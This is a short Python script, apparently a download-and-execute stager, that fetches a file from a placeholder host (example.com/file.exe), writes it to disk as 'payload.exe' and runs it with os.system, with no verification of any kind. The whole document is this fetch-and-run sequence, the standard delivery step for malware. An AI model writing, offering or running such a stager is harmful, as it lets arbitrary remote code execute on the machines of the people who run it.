import requests
import os

url = "http://example.com/file.exe"

response = requests.get(url)

with open("payload.exe", "wb") as file:

    file.write(response.content)

os.system("payload.exe")